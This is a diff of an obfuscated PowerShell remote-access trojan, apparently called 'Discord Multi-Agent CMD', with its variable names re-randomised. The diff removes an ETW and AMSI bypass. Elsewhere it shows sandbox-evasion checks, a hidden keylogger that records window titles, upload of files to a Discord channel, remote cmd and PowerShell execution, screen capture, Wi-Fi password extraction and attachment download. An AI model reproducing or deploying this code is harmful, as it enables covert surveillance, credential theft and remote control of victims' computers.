@@ -1,57 +1,24 @@
-# ═══ In-Memory Patches (Polymorphic) ═══
-# ETW blind (P/Invoke)
-Start-Sleep -Milliseconds 21
-$uM54wHL = @"
-[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
-[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
-[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
-"@
-$BDBd8LY = Add-Type -MemberDefinition $uM54wHL -Name 'UpdateResult59' -Namespace 'InitItem48' -PassThru
-Start-Sleep -Milliseconds 16
-$h7z1v6T9 = ([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108)
-$ULKquy7E = ([char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
-$oTaW = $BDBd8LY::LoadLibrary($h7z1v6T9)
-$PUYrLS2m = $BDBd8LY::GetProcAddress($oTaW, $ULKquy7E)
-Start-Sleep -Milliseconds 20
-$Hcwh = 0
-$BDBd8LY::VirtualProtect($PUYrLS2m, [UIntPtr]::new(1), 0x40, [ref]$Hcwh) | Out-Null
-$PHiTt9 = [byte[]](0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($PHiTt9, 0, $PUYrLS2m, $PHiTt9.Length)
-$BDBd8LY::VirtualProtect($PUYrLS2m, [UIntPtr]::new(1), $Hcwh, [ref]$Hcwh) | Out-Null
-$pr0Sop = [int](3261) % 256
-
-# Runtime memory patch
-[void]([Math]::Abs(11124))
-$fvr0J0Zp = (-join([byte[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,0x74,0x2e,0x41,0x75,0x74,0x6f,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x6d,0x73,0x69,0x55,0x74,0x69,0x6c,0x73)|%{[char]$_}))
-$aGo3MCw = "OCFPZ"
-$GuTC = (-join([byte[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_}))
-$dyuckZHx = [Ref].Assembly.GetType($fvr0J0Zp)
-[void]([Math]::Abs(84822))
-$hPqp = $dyuckZHx.GetField($GuTC, [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uUHVibGljLFN0YXRpYw==")))
-$hPqp.SetValue($null, $true)
-$eCzPg4 = [int](8337) % 256
-
 # ============================================================
 # DISCORD MULTI-AGENT CMD v8.7
 # ============================================================
 # Environment validation
-$st3a = [Environment]::ProcessorCount
-if ($st3a -lt 2) { exit }
-$wIrImPC = [long]0
+$dNJ3pkYW = [Environment]::ProcessorCount
+if ($dNJ3pkYW -lt 2) { exit }
+$Dp6Y6Wq = [long]0
 try {
-    $O4G0Z = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
-    if ($null -ne $O4G0Z) {
-        $wIrImPC = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
+    $hPrQdC2g = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
+    if ($null -ne $hPrQdC2g) {
+        $Dp6Y6Wq = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
     } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
-        $wIrImPC = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
+        $Dp6Y6Wq = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
     }
 } catch {
-    $wIrImPC = 0
+    $Dp6Y6Wq = 0
 }
-if ($wIrImPC -gt 0 -and $wIrImPC -lt 2GB) { exit }
-$OAgn9ko = [System.DateTime]::Now
-Start-Sleep -Milliseconds 1266
-if (([System.DateTime]::Now - $OAgn9ko).TotalMilliseconds -lt 1012) { exit }
+if ($Dp6Y6Wq -gt 0 -and $Dp6Y6Wq -lt 2GB) { exit }
+$PHtCdUX = [System.DateTime]::Now
+Start-Sleep -Milliseconds 4214
+if (([System.DateTime]::Now - $PHtCdUX).TotalMilliseconds -lt 3371) { exit }
 Set-StrictMode -Off
 $ErrorActionPreference = "SilentlyContinue"
 
@@ -140,7 +107,7 @@ $script:CaptureChildCode = (@(
     'Write-Err "child exiting"',
     'Get-ChildItem "$env:TEMP\cap_*.jpg" -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue'
 ) -join "`n")
-if ($null -ne $true) { $CBqwjg = Get-Date }
+$yumv = [System.Net.Dns]::GetHostName().Length
 
 $script:KeylogChildCode = (@(
     'param()',
@@ -166,50 +133,50 @@ $script:KeylogChildCode = (@(
     '        186='';''; 187=''=''; 188='',''; 189=''-''; 190=''.''; 191=''/''; 192=''`'';',
     '        219=''[''; 220=''\''; 221='']''; 222="''";',
     '    }',
-    '    if ($lVZmmN.ContainsKey($deY5)) { return $lVZmmN[$deY5] }',
-    '    if ($deY5 -ge 48 -and $deY5 -le 57) { return [string][char]$deY5 }',
-    '    if ($deY5 -ge 65 -and $deY5 -le 90) { return [string][char]$deY5 }',
-    '    if ($deY5 -ge 96 -and $deY5 -le 105) { return "[NUM" + ($deY5-96) + "]" }',
-    '    if ($deY5 -ge 112 -and $deY5 -le 123) { return "[F" + ($deY5-111) + "]" }',
+    '    if ($YsjFxF2v.ContainsKey($s4tp85)) { return $YsjFxF2v[$s4tp85] }',
+    '    if ($s4tp85 -ge 48 -and $s4tp85 -le 57) { return [string][char]$s4tp85 }',
+    '    if ($s4tp85 -ge 65 -and $s4tp85 -le 90) { return [string][char]$s4tp85 }',
+    '    if ($s4tp85 -ge 96 -and $s4tp85 -le 105) { return "[NUM" + ($s4tp85-96) + "]" }',
+    '    if ($s4tp85 -ge 112 -and $s4tp85 -le 123) { return "[F" + ($s4tp85-111) + "]" }',
     '    return ""',
     '}',
-    '$EI1An = @{}',
-    'for ($RaOc9j = 0; $RaOc9j -lt 256; $RaOc9j++) { $EI1An[$RaOc9j] = $false }',
-    '$kxtfgcB = New-Object System.Text.StringBuilder',
-    '$CQ6vBSV = Get-Date',
-    '$tOvJE = ""',
+    '$aKr6VN = @{}',
+    'for ($hFUm = 0; $hFUm -lt 256; $hFUm++) { $aKr6VN[$hFUm] = $false }',
+    '$cPssS = New-Object System.Text.StringBuilder',
+    '$ZLRZn97 = Get-Date',
+    '$db2LSqa = ""',
     'while ($true) {',
-    '    if (Test-Path -LiteralPath $rm1M) { break }',
+    '    if (Test-Path -LiteralPath $RZX6RT) { break }',
     '    try {',
-    '        $ddvNk = [KB]::GetForegroundWindow()',
-    '        $OVni5O = New-Object System.Text.StringBuilder 256',
-    '        [void][KB]::GetWindowText($ddvNk, $OVni5O, 256)',
-    '        $K3iQ = $OVni5O.ToString()',
-    '        if ($K3iQ -and $K3iQ -ne $tOvJE) {',
-    '            $tOvJE = $K3iQ',
-    '            [void]$kxtfgcB.Append("`n`n--- [" + (Get-Date).ToString("HH:mm:ss") + "] WINDOW: " + $K3iQ + " ---`n")',
+    '        $Dm9cH = [KB]::GetForegroundWindow()',
+    '        $bGuh = New-Object System.Text.StringBuilder 256',
+    '        [void][KB]::GetWindowText($Dm9cH, $bGuh, 256)',
+    '        $VjDd = $bGuh.ToString()',
+    '        if ($VjDd -and $VjDd -ne $db2LSqa) {',
+    '            $db2LSqa = $VjDd',
+    '            [void]$cPssS.Append("`n`n--- [" + (Get-Date).ToString("HH:mm:ss") + "] WINDOW: " + $VjDd + " ---`n")',
     '        }',
     '    } catch { }',
-    '    for ($deY5 = 8; $deY5 -le 254; $deY5++) {',
-    '        $qXKfzymN = [KB]::GetAsyncKeyState($deY5)',
-    '        $reMifI = ($qXKfzymN -band 0x8000) -ne 0',
-    '        if ($reMifI -and -not $EI1An[$deY5]) {',
-    '            $name = Get-KeyName -vk $deY5',
-    '            if ($name) { [void]$kxtfgcB.Append($name) }',
-    '            if ($kxtfgcB.Length -gt 2000 -or ((Get-Date) - $CQ6vBSV).TotalSeconds -gt 5) {',
+    '    for ($s4tp85 = 8; $s4tp85 -le 254; $s4tp85++) {',
+    '        $CxQlw = [KB]::GetAsyncKeyState($s4tp85)',
+    '        $pKTjqpQ = ($CxQlw -band 0x8000) -ne 0',
+    '        if ($pKTjqpQ -and -not $aKr6VN[$s4tp85]) {',
+    '            $name = Get-KeyName -vk $s4tp85',
+    '            if ($name) { [void]$cPssS.Append($name) }',
+    '            if ($cPssS.Length -gt 2000 -or ((Get-Date) - $ZLRZn97).TotalSeconds -gt 5) {',
     '                try {',
-    '                    Add-Content -LiteralPath $qI01Uc -Value $kxtfgcB.ToString() -Encoding UTF8 -EA Stop',
-    '                    [void]$kxtfgcB.Clear()',
-    '                    $CQ6vBSV = Get-Date',
+    '                    Add-Content -LiteralPath $eJIuj -Value $cPssS.ToString() -Encoding UTF8 -EA Stop',
+    '                    [void]$cPssS.Clear()',
+    '                    $ZLRZn97 = Get-Date',
     '                } catch { }',
     '            }',
     '        }',
-    '        $EI1An[$deY5] = $reMifI',
+    '        $aKr6VN[$s4tp85] = $pKTjqpQ',
     '    }',
     '    Start-Sleep -Milliseconds 15',
     '}',
-    'if ($kxtfgcB.Length -gt 0) {',
-    '    try { Add-Content -LiteralPath $qI01Uc -Value $kxtfgcB.ToString() -Encoding UTF8 } catch { }',
+    'if ($cPssS.Length -gt 0) {',
+    '    try { Add-Content -LiteralPath $eJIuj -Value $cPssS.ToString() -Encoding UTF8 } catch { }',
     '}'
 ) -join "`n")
 
@@ -477,62 +444,62 @@ function Send-DiscordFile {
 
     $safeName = ($fInfo.Name -replace '[\\/:*?"<>|]', '_')
 
-    $b1 = $leGR3gBF.GetBytes("--$pqtocX$ViJbnQ")
-    $D7YDQo.Write($b1, 0, $b1.Length)
-    $McWsW = $leGR3gBF.GetBytes("Content-Disposition: form-data; name=`"payload_json`"$ViJbnQ")
-    $D7YDQo.Write($McWsW, 0, $McWsW.Length)
-    $CNzxa3n = $leGR3gBF.GetBytes("Content-Type: application/json$ViJbnQ$ViJbnQ")
-    $D7YDQo.Write($CNzxa3n, 0, $CNzxa3n.Length)
-    $h2nW = $leGR3gBF.GetBytes("$json$ViJbnQ")
-    $D7YDQo.Write($h2nW, 0, $h2nW.Length)
-    $s0zQzPd = $leGR3gBF.GetBytes("--$pqtocX$ViJbnQ")
-    $D7YDQo.Write($s0zQzPd, 0, $s0zQzPd.Length)
-    $sWwggr = $leGR3gBF.GetBytes("Content-Disposition: form-data; name=`"files[0]`"; filename=`"$bg2OaUd`"$ViJbnQ")
-    $D7YDQo.Write($sWwggr, 0, $sWwggr.Length)
-    $fWf4Pqd1 = $leGR3gBF.GetBytes("Content-Type: application/octet-stream$ViJbnQ$ViJbnQ")
-    $D7YDQo.Write($fWf4Pqd1, 0, $fWf4Pqd1.Length)
-    $IFvss = [System.IO.File]::ReadAllBytes($bHlZl)
-    $D7YDQo.Write($IFvss, 0, $IFvss.Length)
-    $H80S = $leGR3gBF.GetBytes("$ViJbnQ--$pqtocX--$ViJbnQ")
-    $D7YDQo.Write($H80S, 0, $H80S.Length)
+    $b1 = $haR9.GetBytes("--$jOBcc$CW8uZU8")
+    $DfG0Yae.Write($b1, 0, $b1.Length)
+    $hFGLTz6 = $haR9.GetBytes("Content-Disposition: form-data; name=`"payload_json`"$CW8uZU8")
+    $DfG0Yae.Write($hFGLTz6, 0, $hFGLTz6.Length)
+    $XW5i9ofQ = $haR9.GetBytes("Content-Type: application/json$CW8uZU8$CW8uZU8")
+    $DfG0Yae.Write($XW5i9ofQ, 0, $XW5i9ofQ.Length)
+    $url0 = $haR9.GetBytes("$json$CW8uZU8")
+    $DfG0Yae.Write($url0, 0, $url0.Length)
+    $e30HaJ = $haR9.GetBytes("--$jOBcc$CW8uZU8")
+    $DfG0Yae.Write($e30HaJ, 0, $e30HaJ.Length)
+    $EPv4 = $haR9.GetBytes("Content-Disposition: form-data; name=`"files[0]`"; filename=`"$VPPtrAM`"$CW8uZU8")
+    $DfG0Yae.Write($EPv4, 0, $EPv4.Length)
+    $UXnP = $haR9.GetBytes("Content-Type: application/octet-stream$CW8uZU8$CW8uZU8")
+    $DfG0Yae.Write($UXnP, 0, $UXnP.Length)
+    $mHge = [System.IO.File]::ReadAllBytes($Pc184j)
+    $DfG0Yae.Write($mHge, 0, $mHge.Length)
+    $EfWrG = $haR9.GetBytes("$CW8uZU8--$jOBcc--$CW8uZU8")
+    $DfG0Yae.Write($EfWrG, 0, $EfWrG.Length)
 
-    $atKqHR9O = $D7YDQo.ToArray()
-    $D7YDQo.Close(); $D7YDQo.Dispose()
+    $TvqxeC = $DfG0Yae.ToArray()
+    $DfG0Yae.Close(); $DfG0Yae.Dispose()
 
-    $e9yef = $false; $XfeP = 0
-    while (-not $e9yef -and $XfeP -lt 3) {
-        $XfeP++
+    $v3pN = $false; $DpOtxiEJ = 0
+    while (-not $v3pN -and $DpOtxiEJ -lt 3) {
+        $DpOtxiEJ++
         try {
-            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$($script:channelId)/messages" -Headers $bqueD -Method Post -Body $atKqHR9O -ContentType "multipart/form-data; boundary=$pqtocX" | Out-Null
-            $e9yef = $true
+            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$($script:channelId)/messages" -Headers $xhD6grE -Method Post -Body $TvqxeC -ContentType "multipart/form-data; boundary=$jOBcc" | Out-Null
+            $v3pN = $true
         } catch {
-            $uc668tP = $null; try { $uc668tP = [int]$_.Exception.Response.StatusCode } catch {}
-            if ($uc668tP -eq 429) { Start-Sleep -Seconds 2 } else { Start-Sleep -Milliseconds 700 }
+            $UqTX = $null; try { $UqTX = [int]$_.Exception.Response.StatusCode } catch {}
+            if ($UqTX -eq 429) { Start-Sleep -Seconds 2 } else { Start-Sleep -Milliseconds 700 }
         }
     }
 }
 
 function Get-AutoTimeout {
     param([string]$Command)
-    $XCOT8 = $Command.ToLower().Trim()
-    if ($XCOT8 -match '^(sfc|chkdsk|dism|msinfo32|dxdiag|defrag|robocopy|wusa|dism\.exe)') { return 600000 }
-    if ($XCOT8 -match '^(wmic|driverquery|systeminfo|net\s+start|net\s+stop|sc\s+start|sc\s+stop|gpupdate|gpresult)') { return 120000 }
+    $sVABApz2 = $Command.ToLower().Trim()
+    if ($sVABApz2 -match '^(sfc|chkdsk|dism|msinfo32|dxdiag|defrag|robocopy|wusa|dism\.exe)') { return 600000 }
+    if ($sVABApz2 -match '^(wmic|driverquery|systeminfo|net\s+start|net\s+stop|sc\s+start|sc\s+stop|gpupdate|gpresult)') { return 120000 }
     return $script:cmdTimeoutMs
 }
 
 function Invoke-CmdCommand {
     param([string]$Command, [int]$TimeoutMs = 0)
-    $tiFLy5Fp = Test-Dangerous -Command $Command
-    if ($tiFLy5Fp) { return "REFUSED: $tiFLy5Fp" }
+    $ki71l = Test-Dangerous -Command $Command
+    if ($ki71l) { return "REFUSED: $ki71l" }
     if ($TimeoutMs -le 0) { $TimeoutMs = Get-AutoTimeout -Command $Command }
-    $wcv8C = [System.Diagnostics.Stopwatch]::StartNew()
-    $nxLQtP7 = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "a_$([guid]::NewGuid().ToString('N')).bat")
-    $xp2qvFiF = "@echo off`r`nchcp 65001>nul 2>&1`r`n$Command`r`n"
-    try { [System.IO.File]::WriteAllText($nxLQtP7, $xp2qvFiF, $script:utf8NoBom) }
+    $oMRs3ChO = [System.Diagnostics.Stopwatch]::StartNew()
+    $mddC = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "a_$([guid]::NewGuid().ToString('N')).bat")
+    $ShQRt = "@echo off`r`nchcp 65001>nul 2>&1`r`n$Command`r`n"
+    try { [System.IO.File]::WriteAllText($mddC, $ShQRt, $script:utf8NoBom) }
     catch { return "WRITE-ERR: $_" }
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $script:cmdExe
-    $psi.Arguments = "/d /c `"`"$nxLQtP7`"`""
+    $psi.Arguments = "/d /c `"`"$mddC`"`""
     $psi.RedirectStandardOutput = $true
     $psi.RedirectStandardError  = $true
     $psi.RedirectStandardInput  = $true
@@ -542,39 +509,39 @@ function Invoke-CmdCommand {
     $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
     $psi.WorkingDirectory = $script:workDir
     try {
-        $ODAUqj = [System.Diagnostics.Process]::Start($psi)
-        try { $ODAUqj.StandardInput.Close() } catch {}
-        $knlmrk = $ODAUqj.StandardOutput.ReadToEndAsync()
-        $jx8vnxF = $ODAUqj.StandardError.ReadToEndAsync()
-        if (-not $ODAUqj.WaitForExit($TimeoutMs)) {
-            $pzaQz = $ODAUqj.Id
-            try { & taskkill.exe /F /T /PID $pzaQz 2>&1 | Out-Null } catch { try { $ODAUqj.Kill() } catch {} }
+        $IJXS = [System.Diagnostics.Process]::Start($psi)
+        try { $IJXS.StandardInput.Close() } catch {}
+        $AoDb = $IJXS.StandardOutput.ReadToEndAsync()
+        $C3GZM = $IJXS.StandardError.ReadToEndAsync()
+        if (-not $IJXS.WaitForExit($TimeoutMs)) {
+            $crOBQNDV = $IJXS.Id
+            try { & taskkill.exe /F /T /PID $crOBQNDV 2>&1 | Out-Null } catch { try { $IJXS.Kill() } catch {} }
             Start-Sleep -Milliseconds 500
-            if (-not $ODAUqj.HasExited) { try { $ODAUqj.Kill() } catch {} }
-            return "TIMEOUT $([int]($TimeoutMs/1000))s (PID $pzaQz)"
+            if (-not $IJXS.HasExited) { try { $IJXS.Kill() } catch {} }
+            return "TIMEOUT $([int]($TimeoutMs/1000))s (PID $crOBQNDV)"
         }
-        $FVc0BFE = $knlmrk.Result; $Xh4r9ys = $jx8vnxF.Result; $wcv8C.Stop()
-        $qUNra = ""
-        if ($FVc0BFE) { $qUNra += [string]$FVc0BFE }
-        if ($Xh4r9ys) { if ($qUNra) { $qUNra += "`n" }; $qUNra += "[STDERR]`n" + [string]$Xh4r9ys }
-        if (-not $qUNra) { $qUNra = "(no output)" }
-        if ($ODAUqj.ExitCode -ne 0) { $qUNra += "`n[Exit: $($ODAUqj.ExitCode)]" }
-        $qUNra += "`n[$($wcv8C.ElapsedMilliseconds)ms]"
-        return [string]$qUNra
+        $ML4Hl = $AoDb.Result; $oaMWn = $C3GZM.Result; $oMRs3ChO.Stop()
+        $DUTw = ""
+        if ($ML4Hl) { $DUTw += [string]$ML4Hl }
+        if ($oaMWn) { if ($DUTw) { $DUTw += "`n" }; $DUTw += "[STDERR]`n" + [string]$oaMWn }
+        if (-not $DUTw) { $DUTw = "(no output)" }
+        if ($IJXS.ExitCode -ne 0) { $DUTw += "`n[Exit: $($IJXS.ExitCode)]" }
+        $DUTw += "`n[$($oMRs3ChO.ElapsedMilliseconds)ms]"
+        return [string]$DUTw
     } catch { return "ERR: $_" }
-    finally { if (Test-Path -LiteralPath $nxLQtP7) { Remove-Item $nxLQtP7 -Force -EA SilentlyContinue } }
+    finally { if (Test-Path -LiteralPath $mddC) { Remove-Item $mddC -Force -EA SilentlyContinue } }
 }
 
 function Invoke-PSCommand {
     param([string]$Command, [int]$TimeoutMs = 0)
-    $tiFLy5Fp = Test-Dangerous -Command $Command
-    if ($tiFLy5Fp) { return "REFUSED: $tiFLy5Fp" }
+    $ki71l = Test-Dangerous -Command $Command
+    if ($ki71l) { return "REFUSED: $ki71l" }
     if ($TimeoutMs -le 0) { $TimeoutMs = Get-AutoTimeout -Command $Command }
-    $wcv8C = [System.Diagnostics.Stopwatch]::StartNew()
-    $leGR3gBF = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
+    $oMRs3ChO = [System.Diagnostics.Stopwatch]::StartNew()
+    $haR9 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $script:psExe
-    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $leGR3gBF"
+    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $haR9"
     $psi.RedirectStandardOutput = $true
     $psi.RedirectStandardError  = $true
     $psi.RedirectStandardInput  = $true
@@ -584,25 +551,25 @@ function Invoke-PSCommand {
     $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
     $psi.WorkingDirectory = $script:workDir
     try {
-        $ODAUqj = [System.Diagnostics.Process]::Start($psi)
-        try { $ODAUqj.StandardInput.Close() } catch {}
-        $knlmrk = $ODAUqj.StandardOutput.ReadToEndAsync()
-        $jx8vnxF = $ODAUqj.StandardError.ReadToEndAsync()
-        if (-not $ODAUqj.WaitForExit($TimeoutMs)) {
-            $pzaQz = $ODAUqj.Id
-            try { & taskkill.exe /F /T /PID $pzaQz 2>&1 | Out-Null } catch { try { $ODAUqj.Kill() } catch {} }
+        $IJXS = [System.Diagnostics.Process]::Start($psi)
+        try { $IJXS.StandardInput.Close() } catch {}
+        $AoDb = $IJXS.StandardOutput.ReadToEndAsync()
+        $C3GZM = $IJXS.StandardError.ReadToEndAsync()
+        if (-not $IJXS.WaitForExit($TimeoutMs)) {
+            $crOBQNDV = $IJXS.Id
+            try { & taskkill.exe /F /T /PID $crOBQNDV 2>&1 | Out-Null } catch { try { $IJXS.Kill() } catch {} }
             Start-Sleep -Milliseconds 500
-            if (-not $ODAUqj.HasExited) { try { $ODAUqj.Kill() } catch {} }
-            return "TIMEOUT $([int]($TimeoutMs/1000))s (PID $pzaQz)"
+            if (-not $IJXS.HasExited) { try { $IJXS.Kill() } catch {} }
+            return "TIMEOUT $([int]($TimeoutMs/1000))s (PID $crOBQNDV)"
         }
-        $FVc0BFE = $knlmrk.Result; $Xh4r9ys = $jx8vnxF.Result; $wcv8C.Stop()
-        $qUNra = ""
-        if ($FVc0BFE) { $qUNra += [string]$FVc0BFE }
-        if ($Xh4r9ys) { if ($qUNra) { $qUNra += "`n" }; $qUNra += "[STDERR]`n" + [string]$Xh4r9ys }
-        if (-not $qUNra) { $qUNra = "(no output)" }
-        if ($ODAUqj.ExitCode -ne 0) { $qUNra += "`n[Exit: $($ODAUqj.ExitCode)]" }
-        $qUNra += "`n[$($wcv8C.ElapsedMilliseconds)ms]"
-        return [string]$qUNra
+        $ML4Hl = $AoDb.Result; $oaMWn = $C3GZM.Result; $oMRs3ChO.Stop()
+        $DUTw = ""
+        if ($ML4Hl) { $DUTw += [string]$ML4Hl }
+        if ($oaMWn) { if ($DUTw) { $DUTw += "`n" }; $DUTw += "[STDERR]`n" + [string]$oaMWn }
+        if (-not $DUTw) { $DUTw = "(no output)" }
+        if ($IJXS.ExitCode -ne 0) { $DUTw += "`n[Exit: $($IJXS.ExitCode)]" }
+        $DUTw += "`n[$($oMRs3ChO.ElapsedMilliseconds)ms]"
+        return [string]$DUTw
     } catch { return "ERR: $_" }
 }
 
@@ -610,11 +577,11 @@ function Take-Screenshot {
     param([string]$Path)
     try {
         $ps1 = Join-Path $env:TEMP "ss_$(Get-Random).ps1"
-        $F87964 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Path))
-        $uc668tP = @"
+        $iBWw = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Path))
+        $UqTX = @"
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
-`$path = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$F87964'))
+`$path = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$iBWw'))
 `$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
 `$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height
 `$g = [System.Drawing.Graphics]::FromImage(`$bmp)
@@ -623,7 +590,7 @@ Add-Type -AssemblyName System.Drawing
 `$g.Dispose()
 `$bmp.Dispose()
 "@
-        $uc668tP | Out-File -FilePath $ps1 -Encoding UTF8 -Force
+        $UqTX | Out-File -FilePath $ps1 -Encoding UTF8 -Force
         & $script:psExe -NoProfile -STA -ExecutionPolicy Bypass -File $ps1 2>&1 | Out-Null
         Remove-Item $ps1 -Force -EA SilentlyContinue
         return (Test-Path $Path)
@@ -636,13 +603,13 @@ function Test-Admin {
 
 function Get-WifiPasswords {
     try {
-        $ODAUqj = (netsh wlan show profiles) -split "`n" | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
-        $knlmrk = @()
-        foreach ($XfeP in $ODAUqj) {
-            $E9w3vj = (netsh wlan show profile name="$XfeP" key=clear) -split "`n" | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
-            $knlmrk += "$XfeP : $(if($E9w3vj){$E9w3vj}else{'(none)'})"
+        $IJXS = (netsh wlan show profiles) -split "`n" | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+        $AoDb = @()
+        foreach ($DpOtxiEJ in $IJXS) {
+            $gUBhD = (netsh wlan show profile name="$DpOtxiEJ" key=clear) -split "`n" | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+            $AoDb += "$DpOtxiEJ : $(if($gUBhD){$gUBhD}else{'(none)'})"
         }
-        return ($knlmrk -join "`n")
+        return ($AoDb -join "`n")
     } catch { return "err: $_" }
 }
 
@@ -651,39 +618,39 @@ function Download-DiscordAttachment {
     if (-not $Message.attachments -or $Message.attachments.Count -eq 0) { return @() }
     if (-not $SaveDir) { $SaveDir = $script:workDir }
     if (-not (Test-Path -LiteralPath $SaveDir)) { New-Item -ItemType Directory -Path $SaveDir -Force | Out-Null }
-    $S2RCI7k6 = @()
-    foreach ($pMn3GStw in $Message.attachments) {
+    $ojWOm = @()
+    foreach ($vdmqY in $Message.attachments) {
         try {
-            $bg2OaUd = ($pMn3GStw.filename -replace '[\\/:*?"<>|]', '_')
-            $path = Join-Path $SaveDir $bg2OaUd
-            $RaOc9j = 1
-            $Uub08z = [System.IO.Path]::GetFileNameWithoutExtension($bg2OaUd)
-            $M0I0PmAK = [System.IO.Path]::GetExtension($bg2OaUd)
-            while (Test-Path -LiteralPath $path) { $path = Join-Path $SaveDir "$Uub08z`_$RaOc9j$M0I0PmAK"; $RaOc9j++ }
-            Invoke-WebRequest -Uri $pMn3GStw.url -OutFile $path -UseBasicParsing -Headers @{ "User-Agent" = "DiscordBot" }
-            $S2RCI7k6 += $path
+            $VPPtrAM = ($vdmqY.filename -replace '[\\/:*?"<>|]', '_')
+            $path = Join-Path $SaveDir $VPPtrAM
+            $hFUm = 1
+            $F06Fj5cB = [System.IO.Path]::GetFileNameWithoutExtension($VPPtrAM)
+            $K7VSs0HD = [System.IO.Path]::GetExtension($VPPtrAM)
+            while (Test-Path -LiteralPath $path) { $path = Join-Path $SaveDir "$F06Fj5cB`_$hFUm$K7VSs0HD"; $hFUm++ }
+            Invoke-WebRequest -Uri $vdmqY.url -OutFile $path -UseBasicParsing -Headers @{ "User-Agent" = "DiscordBot" }
+            $ojWOm += $path
         } catch { }
     }
-    return $S2RCI7k6
+    return $ojWOm
 }
 
 # ==================== CAPTURE STREAM ====================
 function Start-CaptureStream {
     param([int]$Fps = 1, [int]$Quality = 60, [int]$MaxSeconds = 0, [int]$Monitor = 0)
     if ($script:capturePid) {
-        $ODAUqj = Get-Process -Id $script:capturePid -EA SilentlyContinue
-        if ($ODAUqj) { return "already running (PID $($script:capturePid))" }
+        $IJXS = Get-Process -Id $script:capturePid -EA SilentlyContinue
+        if ($IJXS) { return "already running (PID $($script:capturePid))" }
         $script:capturePid = $null
     }
     Remove-Item -LiteralPath $script:captureKillFile -Force -EA SilentlyContinue
     Remove-Item -LiteralPath $script:captureErrFile  -Force -EA SilentlyContinue
 
-    $McGjS6l7 = Join-Path $env:TEMP "dag_cap_$([guid]::NewGuid().ToString('N')).ps1"
-    [System.IO.File]::WriteAllText($McGjS6l7, $script:CaptureChildCode, $script:utf8NoBom)
+    $EVnnM = Join-Path $env:TEMP "dag_cap_$([guid]::NewGuid().ToString('N')).ps1"
+    [System.IO.File]::WriteAllText($EVnnM, $script:CaptureChildCode, $script:utf8NoBom)
 
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName  = $script:psExe
-    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$McGjS6l7`""
+    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$EVnnM`""
     $psi.UseShellExecute = $false
     $psi.CreateNoWindow  = $true
     $psi.WindowStyle     = "Hidden"
@@ -697,12 +664,12 @@ function Start-CaptureStream {
     $psi.EnvironmentVariables["DAG_ERRLOG"]   = $script:captureErrFile
 
     try {
-        $nHVqb = [System.Diagnostics.Process]::Start($psi)
-        $script:capturePid   = $nHVqb.Id
+        $fLkjXhj = [System.Diagnostics.Process]::Start($psi)
+        $script:capturePid   = $fLkjXhj.Id
         $script:captureStart = Get-Date
-        "$($nHVqb.Id)" | Set-Content -LiteralPath $script:capturePidFile -Force -EA SilentlyContinue
-        $FKVBz = if ($MaxSeconds -le 0) { "inf" } else { "${MaxSeconds}s" }
-        return "PID $($nHVqb.Id) | fps=$Fps q=$Quality max=$FKVBz mon=$Monitor"
+        "$($fLkjXhj.Id)" | Set-Content -LiteralPath $script:capturePidFile -Force -EA SilentlyContinue
+        $sxKOl = if ($MaxSeconds -le 0) { "inf" } else { "${MaxSeconds}s" }
+        return "PID $($fLkjXhj.Id) | fps=$Fps q=$Quality max=$sxKOl mon=$Monitor"
